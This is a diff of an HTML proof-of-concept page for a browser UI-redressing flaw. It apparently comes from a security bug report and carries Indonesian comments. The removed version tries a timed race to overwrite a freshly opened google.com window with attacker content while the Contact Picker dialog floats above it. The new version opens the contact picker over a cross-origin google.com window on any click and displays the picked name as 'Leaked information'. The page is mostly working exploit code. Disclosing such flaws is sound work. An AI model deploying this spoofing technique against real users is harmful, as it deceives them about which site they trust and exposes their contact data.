@@ -1,78 +1,28 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <title>PoC: Cross-Origin UI Redressing</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-    <style>
-        body { 
-            font-family: sans-serif; 
-            display: flex; 
-            flex-direction: column;
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            text-align: center; 
-            background-color: #f0f0f0;
-        }
-        .trigger-btn { 
-            padding: 15px 30px; 
-            font-size: 1.2rem; 
-            cursor: pointer; 
-            background-color: #4285f4; 
-            color: white; 
-            border: none; 
-            border-radius: 8px;
-        }
-    </style>
-</head>
-<body>
-
-    <h1>Security Test Page</h1>
-    <p>Click the button below to start the PoC.</p>
-    <button class="trigger-btn" id="pocBtn">Execute PoC</button>
-
-    <script>
-        document.getElementById('pocBtn').onclick = async () => {
-            // 1. Memicu Dialog Kontak (Akan melayang di atas origin baru)
-            (async () => {
-                try {
-                    let contacts = await navigator.contacts.select(["name"], { multiple: false });
-                    if (contacts.length > 0) {
-                        alert("Data Leaked to Attacker: " + contacts["name"]);
-                    }
-                } catch (e) {
-                    console.log("Contact picker closed.");
-                }
-            })();
-
-            // 2. Membuka target Google
-            let win = window.open("https://www.google.com", "PoC_Window");
-
-            // 3. Race Condition: Menimpa konten Google sebelum terikat (bind) ke origin asli
-            // Timeout sangat kecil (0-20ms) biasanya paling efektif untuk menimpa konten
-            setTimeout(() => {
-                try {
-                    win.document.write(`
-                        <!DOCTYPE html>
-                        <html>
-                        <head><title>Google</title></head>
-                        <body style="display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:Arial;">
-                            <div style="text-align:center;">
-                                <h1 style="font-size: 3rem; color: red;">This is not Google!</h1>
-                                <p>The URL bar above says google.com, but this content is controlled by the attacker.</p>
-                                <p>Notice how the Contact Dialog is still visible over this page.</p>
-                            </div>
-                        </body>
-                        </html>
+    <head>
+        <title>PoC</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    let contacts = await navigator.contacts.select(["name"], {});
+                    document.write(`
+                        <h1>
+                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
+                        </h1>
                     `);
-                    win.document.close();
-                } catch (e) {
-                    // Jika gagal karena proteksi browser, log ke console
-                    console.warn("Race condition blocked:", e);
-                }
-            }, 10); 
-        };
-    </script>
-</body>
+                })();
+                open("https://www.google.com", "PoC", "_blank");
+            }
+        </script>
+    </head>  
+    <body>
+        <br><br><br>
+        <center>
+            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
+        </center>
+    </body>
+  </body>
 </html>
